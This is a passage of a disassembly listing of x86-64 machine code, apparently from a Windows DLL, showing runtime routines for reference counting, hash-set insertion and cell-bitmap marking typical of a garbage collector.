    696862ee:	eb d6                	jmp    0x696862c6
    696862f0:	48 39 de             	cmp    %rbx,%rsi
    696862f3:	76 6d                	jbe    0x69686362
    696862f5:	48 8b 13             	mov    (%rbx),%rdx
    696862f8:	48 83 c3 40          	add    $0x40,%rbx
    696862fc:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    69686300:	e8 4b ff ff ff       	call   0x69686250
    69686305:	48 8b 53 c8          	mov    -0x38(%rbx),%rdx
    69686309:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    6968630d:	e8 3e ff ff ff       	call   0x69686250
    69686312:	48 8b 53 d0          	mov    -0x30(%rbx),%rdx
    69686316:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    6968631a:	e8 31 ff ff ff       	call   0x69686250
    6968631f:	48 8b 53 d8          	mov    -0x28(%rbx),%rdx
    69686323:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    69686327:	e8 24 ff ff ff       	call   0x69686250
    6968632c:	48 8b 53 e0          	mov    -0x20(%rbx),%rdx
    69686330:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    69686334:	e8 17 ff ff ff       	call   0x69686250
    69686339:	48 8b 53 e8          	mov    -0x18(%rbx),%rdx
    6968633d:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    69686341:	e8 0a ff ff ff       	call   0x69686250
    69686346:	48 8b 53 f0          	mov    -0x10(%rbx),%rdx
    6968634a:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    6968634e:	e8 fd fe ff ff       	call   0x69686250
    69686353:	48 8b 53 f8          	mov    -0x8(%rbx),%rdx
    69686357:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    6968635b:	e8 f0 fe ff ff       	call   0x69686250
    69686360:	eb 8e                	jmp    0x696862f0
    69686362:	48 39 df             	cmp    %rbx,%rdi
    69686365:	72 12                	jb     0x69686379
    69686367:	48 8b 13             	mov    (%rbx),%rdx
    6968636a:	48 83 c3 08          	add    $0x8,%rbx
    6968636e:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    69686372:	e8 d9 fe ff ff       	call   0x69686250
    69686377:	eb e9                	jmp    0x69686362
    69686379:	48 81 c4 20 01 00 00 	add    $0x120,%rsp
    69686380:	5b                   	pop    %rbx
    69686381:	5e                   	pop    %rsi
    69686382:	5f                   	pop    %rdi
    69686383:	41 5c                	pop    %r12
    69686385:	5d                   	pop    %rbp
    69686386:	c3                   	ret
    69686387:	48 8b 02             	mov    (%rdx),%rax
    6968638a:	a8 04                	test   $0x4,%al
    6968638c:	75 0c                	jne    0x6968639a
    6968638e:	48 83 c8 04          	or     $0x4,%rax
    69686392:	48 89 02             	mov    %rax,(%rdx)
    69686395:	e9 3d fe ff ff       	jmp    0x696861d7
    6968639a:	c3                   	ret
    6968639b:	56                   	push   %rsi
    6968639c:	53                   	push   %rbx
    6968639d:	48 83 ec 28          	sub    $0x28,%rsp
    696863a1:	48 85 d2             	test   %rdx,%rdx
    696863a4:	48 89 ce             	mov    %rcx,%rsi
    696863a7:	48 89 d3             	mov    %rdx,%rbx
    696863aa:	74 05                	je     0x696863b1
    696863ac:	48 83 42 f0 08       	addq   $0x8,-0x10(%rdx)
    696863b1:	48 8b 0e             	mov    (%rsi),%rcx
    696863b4:	48 85 c9             	test   %rcx,%rcx
    696863b7:	74 22                	je     0x696863db
    696863b9:	48 8b 41 f0          	mov    -0x10(%rcx),%rax
    696863bd:	48 8d 51 f0          	lea    -0x10(%rcx),%rdx
    696863c1:	48 83 e8 08          	sub    $0x8,%rax
    696863c5:	48 83 f8 07          	cmp    $0x7,%rax
    696863c9:	48 89 41 f0          	mov    %rax,-0x10(%rcx)
    696863cd:	77 0c                	ja     0x696863db
    696863cf:	48 8d 0d 42 b6 0f 00 	lea    0xfb642(%rip),%rcx        # 0x69781a18
    696863d6:	e8 ac ff ff ff       	call   0x69686387
    696863db:	48 89 1e             	mov    %rbx,(%rsi)
    696863de:	48 83 c4 28          	add    $0x28,%rsp
    696863e2:	5b                   	pop    %rbx
    696863e3:	5e                   	pop    %rsi
    696863e4:	c3                   	ret
    696863e5:	48 8b 41 f0          	mov    -0x10(%rcx),%rax
    696863e9:	48 8d 51 f0          	lea    -0x10(%rcx),%rdx
    696863ed:	48 83 e8 08          	sub    $0x8,%rax
    696863f1:	48 83 f8 07          	cmp    $0x7,%rax
    696863f5:	48 89 41 f0          	mov    %rax,-0x10(%rcx)
    696863f9:	77 09                	ja     0x69686404
    696863fb:	48 8d 0d 16 b6 0f 00 	lea    0xfb616(%rip),%rcx        # 0x69781a18
    69686402:	eb 83                	jmp    0x69686387
    69686404:	c3                   	ret
    69686405:	48 8b 01             	mov    (%rcx),%rax
    69686408:	48 83 e8 08          	sub    $0x8,%rax
    6968640c:	48 89 ca             	mov    %rcx,%rdx
    6968640f:	48 83 f8 07          	cmp    $0x7,%rax
    69686413:	48 89 01             	mov    %rax,(%rcx)
    69686416:	77 0c                	ja     0x69686424
    69686418:	48 8d 0d f9 b5 0f 00 	lea    0xfb5f9(%rip),%rcx        # 0x69781a18
    6968641f:	e9 63 ff ff ff       	jmp    0x69686387
    69686424:	c3                   	ret
    69686425:	56                   	push   %rsi
    69686426:	53                   	push   %rbx
    69686427:	48 83 ec 28          	sub    $0x28,%rsp
    6968642b:	48 89 ce             	mov    %rcx,%rsi
    6968642e:	48 89 d3             	mov    %rdx,%rbx
    69686431:	e8 09 ea ff ff       	call   0x69684e3f
    69686436:	84 c0                	test   %al,%al
    69686438:	75 1f                	jne    0x69686459
    6968643a:	48 85 db             	test   %rbx,%rbx
    6968643d:	74 05                	je     0x69686444
    6968643f:	48 83 43 f0 08       	addq   $0x8,-0x10(%rbx)
    69686444:	48 8b 0e             	mov    (%rsi),%rcx
    69686447:	48 81 f9 ff 0f 00 00 	cmp    $0xfff,%rcx
    6968644e:	76 09                	jbe    0x69686459
    69686450:	48 83 e9 10          	sub    $0x10,%rcx
    69686454:	e8 ac ff ff ff       	call   0x69686405
    69686459:	48 89 1e             	mov    %rbx,(%rsi)
    6968645c:	48 83 c4 28          	add    $0x28,%rsp
    69686460:	5b                   	pop    %rbx
    69686461:	5e                   	pop    %rsi
    69686462:	c3                   	ret
    69686463:	56                   	push   %rsi
    69686464:	53                   	push   %rbx
    69686465:	48 83 ec 28          	sub    $0x28,%rsp
    69686469:	48 89 cb             	mov    %rcx,%rbx
    6968646c:	48 89 d6             	mov    %rdx,%rsi
    6968646f:	4c 89 c1             	mov    %r8,%rcx
    69686472:	48 85 db             	test   %rbx,%rbx
    69686475:	74 07                	je     0x6968647e
    69686477:	48 85 f6             	test   %rsi,%rsi
    6968647a:	75 07                	jne    0x69686483
    6968647c:	eb 1f                	jmp    0x6968649d
    6968647e:	48 89 f2             	mov    %rsi,%rdx
    69686481:	eb 1d                	jmp    0x696864a0
    69686483:	8b 46 04             	mov    0x4(%rsi),%eax
    69686486:	39 43 04             	cmp    %eax,0x4(%rbx)
    69686489:	7c 20                	jl     0x696864ab
    6968648b:	48 89 f2             	mov    %rsi,%rdx
    6968648e:	e8 92 ff ff ff       	call   0x69686425
    69686493:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
    69686497:	48 8b 76 08          	mov    0x8(%rsi),%rsi
    6968649b:	eb d5                	jmp    0x69686472
    6968649d:	48 89 da             	mov    %rbx,%rdx
    696864a0:	48 83 c4 28          	add    $0x28,%rsp
    696864a4:	5b                   	pop    %rbx
    696864a5:	5e                   	pop    %rsi
    696864a6:	e9 7a ff ff ff       	jmp    0x69686425
    696864ab:	48 89 da             	mov    %rbx,%rdx
    696864ae:	e8 72 ff ff ff       	call   0x69686425
    696864b3:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
    696864b7:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
    696864bb:	eb b5                	jmp    0x69686472
    696864bd:	57                   	push   %rdi
    696864be:	56                   	push   %rsi
    696864bf:	53                   	push   %rbx
    696864c0:	48 83 ec 20          	sub    $0x20,%rsp
    696864c4:	48 89 d3             	mov    %rdx,%rbx
    696864c7:	4c 89 c6             	mov    %r8,%rsi
    696864ca:	44 89 cf             	mov    %r9d,%edi
    696864cd:	48 85 c9             	test   %rcx,%rcx
    696864d0:	74 1c                	je     0x696864ee
    696864d2:	39 39                	cmp    %edi,(%rcx)
    696864d4:	7c 33                	jl     0x69686509
    696864d6:	48 89 ca             	mov    %rcx,%rdx
    696864d9:	48 89 f1             	mov    %rsi,%rcx
    696864dc:	e8 44 ff ff ff       	call   0x69686425
    696864e1:	48 8b 06             	mov    (%rsi),%rax
    696864e4:	48 8d 70 08          	lea    0x8(%rax),%rsi
    696864e8:	48 8b 48 08          	mov    0x8(%rax),%rcx
    696864ec:	eb df                	jmp    0x696864cd
    696864ee:	31 d2                	xor    %edx,%edx
    696864f0:	48 89 d9             	mov    %rbx,%rcx
    696864f3:	e8 2d ff ff ff       	call   0x69686425
    696864f8:	31 d2                	xor    %edx,%edx
    696864fa:	48 89 f1             	mov    %rsi,%rcx
    696864fd:	48 83 c4 20          	add    $0x20,%rsp
    69686501:	5b                   	pop    %rbx
    69686502:	5e                   	pop    %rsi
    69686503:	5f                   	pop    %rdi
    69686504:	e9 1c ff ff ff       	jmp    0x69686425
    69686509:	48 89 ca             	mov    %rcx,%rdx
    6968650c:	48 89 d9             	mov    %rbx,%rcx
    6968650f:	e8 11 ff ff ff       	call   0x69686425
    69686514:	48 8b 03             	mov    (%rbx),%rax
    69686517:	48 8d 58 10          	lea    0x10(%rax),%rbx
    6968651b:	48 8b 48 10          	mov    0x10(%rax),%rcx
    6968651f:	eb ac                	jmp    0x696864cd
    69686521:	56                   	push   %rsi
    69686522:	53                   	push   %rbx
    69686523:	48 83 ec 28          	sub    $0x28,%rsp
    69686527:	48 85 d2             	test   %rdx,%rdx
    6968652a:	48 89 ce             	mov    %rcx,%rsi
    6968652d:	48 89 d3             	mov    %rdx,%rbx
    69686530:	74 05                	je     0x69686537
    69686532:	48 83 42 f0 08       	addq   $0x8,-0x10(%rdx)
    69686537:	48 8b 0e             	mov    (%rsi),%rcx
    6968653a:	48 85 c9             	test   %rcx,%rcx
    6968653d:	74 09                	je     0x69686548
    6968653f:	48 83 e9 10          	sub    $0x10,%rcx
    69686543:	e8 bd fe ff ff       	call   0x69686405
    69686548:	48 89 1e             	mov    %rbx,(%rsi)
    6968654b:	48 83 c4 28          	add    $0x28,%rsp
    6968654f:	5b                   	pop    %rbx
    69686550:	5e                   	pop    %rsi
    69686551:	c3                   	ret
    69686552:	55                   	push   %rbp
    69686553:	57                   	push   %rdi
    69686554:	56                   	push   %rsi
    69686555:	53                   	push   %rbx
    69686556:	48 83 ec 28          	sub    $0x28,%rsp
    6968655a:	31 db                	xor    %ebx,%ebx
    6968655c:	48 8b 41 30          	mov    0x30(%rcx),%rax
    69686560:	48 8b 69 40          	mov    0x40(%rcx),%rbp
    69686564:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
    69686568:	48 89 cf             	mov    %rcx,%rdi
    6968656b:	48 39 f3             	cmp    %rsi,%rbx
    6968656e:	7e 11                	jle    0x69686581
    69686570:	48 c7 47 30 00 00 00 	movq   $0x0,0x30(%rdi)
    69686577:	00 
    69686578:	48 83 c4 28          	add    $0x28,%rsp
    6968657c:	5b                   	pop    %rbx
    6968657d:	5e                   	pop    %rsi
    6968657e:	5f                   	pop    %rdi
    6968657f:	5d                   	pop    %rbp
    69686580:	c3                   	ret
    69686581:	48 8b 4c dd 00       	mov    0x0(%rbp,%rbx,8),%rcx
    69686586:	48 ff c3             	inc    %rbx
    69686589:	e8 77 fe ff ff       	call   0x69686405
    6968658e:	eb db                	jmp    0x6968656b
    69686590:	53                   	push   %rbx
    69686591:	48 83 ec 30          	sub    $0x30,%rsp
    69686595:	48 89 d3             	mov    %rdx,%rbx
    69686598:	e8 10 fc ff ff       	call   0x696861ad
    6968659d:	48 89 da             	mov    %rbx,%rdx
    696865a0:	48 89 c1             	mov    %rax,%rcx
    696865a3:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    696865a8:	e8 1f b4 ff ff       	call   0x696819cc
    696865ad:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    696865b2:	48 83 c4 30          	add    $0x30,%rsp
    696865b6:	5b                   	pop    %rbx
    696865b7:	c3                   	ret
    696865b8:	48 89 ca             	mov    %rcx,%rdx
    696865bb:	48 8d 0d a6 b4 0f 00 	lea    0xfb4a6(%rip),%rcx        # 0x69781a68
    696865c2:	eb cc                	jmp    0x69686590
    696865c4:	57                   	push   %rdi
    696865c5:	56                   	push   %rsi
    696865c6:	53                   	push   %rbx
    696865c7:	48 83 ec 20          	sub    $0x20,%rsp
    696865cb:	48 8b 71 08          	mov    0x8(%rcx),%rsi
    696865cf:	48 8d 44 36 01       	lea    0x1(%rsi,%rsi,1),%rax
    696865d4:	48 89 cb             	mov    %rcx,%rbx
    696865d7:	48 8d 4e 01          	lea    0x1(%rsi),%rcx
    696865db:	48 89 43 08          	mov    %rax,0x8(%rbx)
    696865df:	48 c1 e1 04          	shl    $0x4,%rcx
    696865e3:	e8 d0 ff ff ff       	call   0x696865b8
    696865e8:	45 31 d2             	xor    %r10d,%r10d
    696865eb:	48 89 c7             	mov    %rax,%rdi
    696865ee:	49 39 f2             	cmp    %rsi,%r10
    696865f1:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
    696865f5:	7e 11                	jle    0x69686608
    696865f7:	e8 95 f6 ff ff       	call   0x69685c91
    696865fc:	48 89 7b 18          	mov    %rdi,0x18(%rbx)
    69686600:	48 83 c4 20          	add    $0x20,%rsp
    69686604:	5b                   	pop    %rbx
    69686605:	5e                   	pop    %rsi
    69686606:	5f                   	pop    %rdi
    69686607:	c3                   	ret
    69686608:	4e 8b 04 d1          	mov    (%rcx,%r10,8),%r8
    6968660c:	4d 85 c0             	test   %r8,%r8
    6968660f:	74 0b                	je     0x6968661c
    69686611:	48 89 fa             	mov    %rdi,%rdx
    69686614:	48 89 d9             	mov    %rbx,%rcx
    69686617:	e8 96 ea ff ff       	call   0x696850b2
    6968661c:	49 ff c2             	inc    %r10
    6968661f:	eb cd                	jmp    0x696865ee
    69686621:	57                   	push   %rdi
    69686622:	56                   	push   %rsi
    69686623:	53                   	push   %rbx
    69686624:	48 83 ec 20          	sub    $0x20,%rsp
    69686628:	48 89 cb             	mov    %rcx,%rbx
    6968662b:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    6968662f:	48 89 d6             	mov    %rdx,%rsi
    69686632:	49 89 c8             	mov    %rcx,%r8
    69686635:	49 21 d0             	and    %rdx,%r8
    69686638:	48 8b 53 18          	mov    0x18(%rbx),%rdx
    6968663c:	4a 8b 04 c2          	mov    (%rdx,%r8,8),%rax
    69686640:	48 85 c0             	test   %rax,%rax
    69686643:	74 12                	je     0x69686657
    69686645:	48 39 70 08          	cmp    %rsi,0x8(%rax)
    69686649:	74 7f                	je     0x696866ca
    6968664b:	4f 8d 04 80          	lea    (%r8,%r8,4),%r8
    6968664f:	49 ff c0             	inc    %r8
    69686652:	49 21 c8             	and    %rcx,%r8
    69686655:	eb e5                	jmp    0x6968663c
    69686657:	48 8b 03             	mov    (%rbx),%rax
    6968665a:	48 ff c1             	inc    %rcx
    6968665d:	4c 8d 04 09          	lea    (%rcx,%rcx,1),%r8
    69686661:	48 8d 14 40          	lea    (%rax,%rax,2),%rdx
    69686665:	49 39 d0             	cmp    %rdx,%r8
    69686668:	7c 09                	jl     0x69686673
    6968666a:	48 29 c1             	sub    %rax,%rcx
    6968666d:	48 83 f9 03          	cmp    $0x3,%rcx
    69686671:	7f 08                	jg     0x6968667b
    69686673:	48 89 d9             	mov    %rbx,%rcx
    69686676:	e8 49 ff ff ff       	call   0x696865c4
    6968667b:	48 8b 53 08          	mov    0x8(%rbx),%rdx
    6968667f:	48 89 f0             	mov    %rsi,%rax
    69686682:	48 ff 03             	incq   (%rbx)
    69686685:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
    69686689:	48 21 d0             	and    %rdx,%rax
    6968668c:	48 83 3c c1 00       	cmpq   $0x0,(%rcx,%rax,8)
    69686691:	48 8d 3c c5 00 00 00 	lea    0x0(,%rax,8),%rdi
    69686698:	00 
    69686699:	75 23                	jne    0x696866be
    6968669b:	b9 30 00 00 00       	mov    $0x30,%ecx
    696866a0:	e8 13 ff ff ff       	call   0x696865b8
    696866a5:	48 8b 53 10          	mov    0x10(%rbx),%rdx
    696866a9:	48 89 70 08          	mov    %rsi,0x8(%rax)
    696866ad:	48 89 10             	mov    %rdx,(%rax)
    696866b0:	48 8b 53 18          	mov    0x18(%rbx),%rdx
    696866b4:	48 89 43 10          	mov    %rax,0x10(%rbx)
    696866b8:	48 89 04 3a          	mov    %rax,(%rdx,%rdi,1)
    696866bc:	eb 0c                	jmp    0x696866ca
    696866be:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
    696866c2:	48 ff c0             	inc    %rax
    696866c5:	48 21 d0             	and    %rdx,%rax
    696866c8:	eb c2                	jmp    0x6968668c
    696866ca:	48 83 c4 20          	add    $0x20,%rsp
    696866ce:	5b                   	pop    %rbx
    696866cf:	5e                   	pop    %rsi
    696866d0:	5f                   	pop    %rdi
    696866d1:	c3                   	ret
    696866d2:	53                   	push   %rbx
    696866d3:	48 83 ec 20          	sub    $0x20,%rsp
    696866d7:	48 89 d3             	mov    %rdx,%rbx
    696866da:	48 c1 ea 0c          	shr    $0xc,%rdx
    696866de:	e8 3e ff ff ff       	call   0x69686621
    696866e3:	48 c1 eb 04          	shr    $0x4,%rbx
    696866e7:	ba 01 00 00 00       	mov    $0x1,%edx
    696866ec:	0f b6 cb             	movzbl %bl,%ecx
    696866ef:	49 89 c8             	mov    %rcx,%r8
    696866f2:	48 d3 e2             	shl    %cl,%rdx
    696866f5:	49 c1 e8 06          	shr    $0x6,%r8
    696866f9:	4a 09 54 c0 10       	or     %rdx,0x10(%rax,%r8,8)
    696866fe:	48 83 c4 20          	add    $0x20,%rsp
    69686702:	5b                   	pop    %rbx
    69686703:	c3                   	ret
    69686704:	48 83 ec 28          	sub    $0x28,%rsp
    69686708:	49 89 d2             	mov    %rdx,%r10
    6968670b:	48 c1 ea 0c          	shr    $0xc,%rdx
    6968670f:	49 89 cb             	mov    %rcx,%r11
    69686712:	e8 93 e8 ff ff       	call   0x69684faa
    69686717:	48 85 c0             	test   %rax,%rax
    6968671a:	75 0d                	jne    0x69686729
    6968671c:	4c 89 d2             	mov    %r10,%rdx
    6968671f:	4c 89 d9             	mov    %r11,%rcx
    69686722:	e8 ab ff ff ff       	call   0x696866d2
    69686727:	eb 30                	jmp    0x69686759
    69686729:	49 c1 ea 04          	shr    $0x4,%r10
    6968672d:	41 0f b6 ca          	movzbl %r10b,%ecx
    69686731:	48 89 ca             	mov    %rcx,%rdx
    69686734:	48 c1 ea 06          	shr    $0x6,%rdx
    69686738:	4c 8d 04 d0          	lea    (%rax,%rdx,8),%r8
    6968673c:	b8 01 00 00 00       	mov    $0x1,%eax
    69686741:	49 8b 50 10          	mov    0x10(%r8),%rdx
    69686745:	48 d3 e0             	shl    %cl,%rax
    69686748:	48 89 c1             	mov    %rax,%rcx
    6968674b:	b0 01                	mov    $0x1,%al
    6968674d:	48 85 ca             	test   %rcx,%rdx
    69686750:	75 09                	jne    0x6968675b
    69686752:	48 09 ca             	or     %rcx,%rdx
    69686755:	49 89 50 10          	mov    %rdx,0x10(%r8)
    69686759:	31 c0                	xor    %eax,%eax
    6968675b:	48 83 c4 28          	add    $0x28,%rsp
    6968675f:	c3                   	ret
    69686760:	57                   	push   %rdi
    69686761:	56                   	push   %rsi
    69686762:	53                   	push   %rbx
    69686763:	48 83 ec 20          	sub    $0x20,%rsp
    69686767:	48 8d b9 90 2b 00 00 	lea    0x2b90(%rcx),%rdi
    6968676e:	48 89 cb             	mov    %rcx,%rbx
    69686771:	48 89 d6             	mov    %rdx,%rsi
    69686774:	48 89 f9             	mov    %rdi,%rcx
    69686777:	e8 56 ff ff ff       	call   0x696866d2
    6968677c:	ba 01 00 00 00       	mov    $0x1,%edx
    69686781:	48 89 f1             	mov    %rsi,%rcx
    69686784:	e8 1d 06 00 00       	call   0x69686da6
    69686789:	48 8b 43 48          	mov    0x48(%rbx),%rax
    6968678d:	48 85 c0             	test   %rax,%rax
    69686790:	7e 20                	jle    0x696867b2
    69686792:	48 8b 53 58          	mov    0x58(%rbx),%rdx
    69686796:	48 ff c8             	dec    %rax
    69686799:	48 89 f9             	mov    %rdi,%rcx
    6968679c:	48 89 43 48          	mov    %rax,0x48(%rbx)
    696867a0:	48 8b 34 c2          	mov    (%rdx,%rax,8),%rsi
    696867a4:	48 89 f2             	mov    %rsi,%rdx
    696867a7:	e8 58 ff ff ff       	call   0x69686704
    696867ac:	84 c0                	test   %al,%al
    696867ae:	75 d9                	jne    0x69686789
    696867b0:	eb ca                	jmp    0x6968677c
    696867b2:	48 83 c4 20          	add    $0x20,%rsp
    696867b6:	5b                   	pop    %rbx
    696867b7:	5e                   	pop    %rsi
    696867b8:	5f                   	pop    %rdi
    696867b9:	c3                   	ret
    696867ba:	55                   	push   %rbp
    696867bb:	57                   	push   %rdi
    696867bc:	56                   	push   %rsi
    696867bd:	53                   	push   %rbx
    696867be:	48 83 ec 28          	sub    $0x28,%rsp
    696867c2:	48 83 b9 c8 2b 00 00 	cmpq   $0x0,0x2bc8(%rcx)
    696867c9:	00 
    696867ca:	48 89 ce             	mov    %rcx,%rsi
    696867cd:	75 22                	jne    0x696867f1
    696867cf:	48 8b 05 1a e9 0f 00 	mov    0xfe91a(%rip),%rax        # 0x697850f0
    696867d6:	48 8d 2d 23 ee 0f 00 	lea    0xfee23(%rip),%rbp        # 0x69785600
    696867dd:	31 db                	xor    %ebx,%ebx
    696867df:	48 8d 78 ff          	lea    -0x1(%rax),%rdi
    696867e3:	48 39 fb             	cmp    %rdi,%rbx
    696867e6:	7f 09                	jg     0x696867f1
    696867e8:	ff 54 dd 00          	call   *0x0(%rbp,%rbx,8)
    696867ec:	48 ff c3             	inc    %rbx
    696867ef:	eb f2                	jmp    0x696867e3
    696867f1:	48 8b 05 88 ed 0f 00 	mov    0xfed88(%rip),%rax        # 0x69785580
    696867f8:	48 8d 2d 81 43 0f 00 	lea    0xf4381(%rip),%rbp        # 0x6977ab80
    696867ff:	31 db                	xor    %ebx,%ebx
    69686801:	48 8d 78 ff          	lea    -0x1(%rax),%rdi
    69686805:	48 39 fb             	cmp    %rdi,%rbx
    69686808:	7e 16                	jle    0x69686820
    6968680a:	48 8b 86 b0 2b 00 00 	mov    0x2bb0(%rsi),%rax
    69686811:	31 db                	xor    %ebx,%ebx
    69686813:	48 8b ae c0 2b 00 00 	mov    0x2bc0(%rsi),%rbp
    6968681a:	48 8d 78 ff          	lea    -0x1(%rax),%rdi
    6968681e:	eb 09                	jmp    0x69686829
    69686820:	ff 54 dd 00          	call   *0x0(%rbp,%rbx,8)
    69686824:	48 ff c3             	inc    %rbx
    69686827:	eb dc                	jmp    0x69686805
    69686829:	48 39 fb             	cmp    %rdi,%rbx
    6968682c:	7f 12                	jg     0x69686840
    6968682e:	48 8b 54 dd 00       	mov    0x0(%rbp,%rbx,8),%rdx
    69686833:	48 89 f1             	mov    %rsi,%rcx
    69686836:	48 ff c3             	inc    %rbx
    69686839:	e8 22 ff ff ff       	call   0x69686760
    6968683e:	eb e9                	jmp    0x69686829
    69686840:	48 83 c4 28          	add    $0x28,%rsp
    69686844:	5b                   	pop    %rbx
    69686845:	5e                   	pop    %rsi
    69686846:	5f                   	pop    %rdi
    69686847:	5d                   	pop    %rbp
    69686848:	c3                   	ret
    69686849:	48 85 c9             	test   %rcx,%rcx
    6968684c:	74 3c                	je     0x6968688a
    6968684e:	48 83 e9 10          	sub    $0x10,%rcx
    69686852:	80 fa 01             	cmp    $0x1,%dl
    69686855:	74 24                	je     0x6968687b
    69686857:	84 d2                	test   %dl,%dl
    69686859:	74 11                	je     0x6968686c
    6968685b:	80 fa 02             	cmp    $0x2,%dl
    6968685e:	74 07                	je     0x69686867
    69686860:	80 fa 03             	cmp    $0x3,%dl
    69686863:	74 16                	je     0x6968687b
    69686865:	eb 23                	jmp    0x6968688a
    69686867:	e9 99 fb ff ff       	jmp    0x69686405
    6968686c:	48 89 ca             	mov    %rcx,%rdx
    6968686f:	48 8d 0d 8a b1 0f 00 	lea    0xfb18a(%rip),%rcx        # 0x69781a00
    69686876:	e9 e5 fe ff ff       	jmp    0x69686760
    6968687b:	48 89 ca             	mov    %rcx,%rdx
    6968687e:	48 8d 0d c3 b1 0f 00 	lea    0xfb1c3(%rip),%rcx        # 0x69781a48
    69686885:	e9 4d f9 ff ff       	jmp    0x696861d7
    6968688a:	c3                   	ret
    6968688b:	0f b6 d2             	movzbl %dl,%edx
    6968688e:	eb b9                	jmp    0x69686849
    69686890:	48 8b 0d f1 ec 0f 00 	mov    0xfecf1(%rip),%rcx        # 0x69785588
    69686897:	31 d2                	xor    %edx,%edx
    69686899:	eb ae                	jmp    0x69686849
    6968689b:	48 8b 0d 5e de 0f 00 	mov    0xfde5e(%rip),%rcx        # 0x69784700
    696868a2:	31 d2                	xor    %edx,%edx
    696868a4:	eb a3                	jmp    0x69686849
    696868a6:	48 8b 0d b3 5b 10 00 	mov    0x105bb3(%rip),%rcx        # 0x6978c460
    696868ad:	31 d2                	xor    %edx,%edx
    696868af:	eb 98                	jmp    0x69686849
    696868b1:	48 8b 0d 18 41 0f 00 	mov    0xf4118(%rip),%rcx        # 0x6977a9d0
    696868b8:	31 d2                	xor    %edx,%edx
    696868ba:	eb 8d                	jmp    0x69686849
    696868bc:	48 8b 0d c5 5e 10 00 	mov    0x105ec5(%rip),%rcx        # 0x6978c788
    696868c3:	31 d2                	xor    %edx,%edx
    696868c5:	eb 82                	jmp    0x69686849
    696868c7:	48 8b 0d fa 40 0f 00 	mov    0xf40fa(%rip),%rcx        # 0x6977a9c8
    696868ce:	31 d2                	xor    %edx,%edx
    696868d0:	e9 74 ff ff ff       	jmp    0x69686849
    696868d5:	48 8b 0d e4 5f 10 00 	mov    0x105fe4(%rip),%rcx        # 0x6978c8c0
    696868dc:	31 d2                	xor    %edx,%edx
    696868de:	e9 66 ff ff ff       	jmp    0x69686849
    696868e3:	48 8b 0d 76 40 0f 00 	mov    0xf4076(%rip),%rcx        # 0x6977a960
    696868ea:	31 d2                	xor    %edx,%edx
    696868ec:	e9 58 ff ff ff       	jmp    0x69686849
    696868f1:	48 8b 0d 68 41 0f 00 	mov    0xf4168(%rip),%rcx        # 0x6977aa60
    696868f8:	31 d2                	xor    %edx,%edx
    696868fa:	e9 4a ff ff ff       	jmp    0x69686849
    696868ff:	48 8b 0d d2 40 0f 00 	mov    0xf40d2(%rip),%rcx        # 0x6977a9d8
    69686906:	31 d2                	xor    %edx,%edx
    69686908:	e9 3c ff ff ff       	jmp    0x69686849
    6968690d:	48 8b 0d 54 5b 10 00 	mov    0x105b54(%rip),%rcx        # 0x6978c468
    69686914:	31 d2                	xor    %edx,%edx
    69686916:	e9 2e ff ff ff       	jmp    0x69686849
    6968691b:	48 8b 0d 5e e7 0f 00 	mov    0xfe75e(%rip),%rcx        # 0x69785080
    69686922:	31 d2                	xor    %edx,%edx
    69686924:	e9 20 ff ff ff       	jmp    0x69686849
    69686929:	48 8b 0d c8 e2 0f 00 	mov    0xfe2c8(%rip),%rcx        # 0x69784bf8
    69686930:	31 d2                	xor    %edx,%edx
    69686932:	e9 12 ff ff ff       	jmp    0x69686849
    69686937:	48 8b 0d e2 ea 0f 00 	mov    0xfeae2(%rip),%rcx        # 0x69785420
    6968693e:	31 d2                	xor    %edx,%edx
    69686940:	e9 04 ff ff ff       	jmp    0x69686849
    69686945:	48 8b 0d 74 5c 10 00 	mov    0x105c74(%rip),%rcx        # 0x6978c5c0
    6968694c:	31 d2                	xor    %edx,%edx
    6968694e:	e9 f6 fe ff ff       	jmp    0x69686849
    69686953:	48 8b 0d 9e 5c 10 00 	mov    0x105c9e(%rip),%rcx        # 0x6978c5f8
    6968695a:	31 d2                	xor    %edx,%edx
    6968695c:	e9 e8 fe ff ff       	jmp    0x69686849
    69686961:	48 8b 0d b0 eb 0f 00 	mov    0xfebb0(%rip),%rcx        # 0x69785518
    69686968:	31 d2                	xor    %edx,%edx
    6968696a:	e9 da fe ff ff       	jmp    0x69686849
    6968696f:	48 8b 0d 0a df 0f 00 	mov    0xfdf0a(%rip),%rcx        # 0x69784880
    69686976:	31 d2                	xor    %edx,%edx
    69686978:	e9 cc fe ff ff       	jmp    0x69686849
    6968697d:	48 8b 0d 5c ec 0f 00 	mov    0xfec5c(%rip),%rcx        # 0x697855e0
    69686984:	31 d2                	xor    %edx,%edx
    69686986:	e9 be fe ff ff       	jmp    0x69686849
    6968698b:	48 8b 0d 56 e7 0f 00 	mov    0xfe756(%rip),%rcx        # 0x697850e8
    69686992:	31 d2                	xor    %edx,%edx
    69686994:	e9 b0 fe ff ff       	jmp    0x69686849
    69686999:	48 8b 0d 70 eb 0f 00 	mov    0xfeb70(%rip),%rcx        # 0x69785510
    696869a0:	31 d2                	xor    %edx,%edx
    696869a2:	e9 a2 fe ff ff       	jmp    0x69686849
    696869a7:	56                   	push   %rsi
    696869a8:	53                   	push   %rbx
    696869a9:	48 83 ec 28          	sub    $0x28,%rsp
    696869ad:	48 89 ce             	mov    %rcx,%rsi
    696869b0:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    696869b4:	0f b6 da             	movzbl %dl,%ebx
    696869b7:	89 da                	mov    %ebx,%edx
    696869b9:	e8 8b fe ff ff       	call   0x69686849
    696869be:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
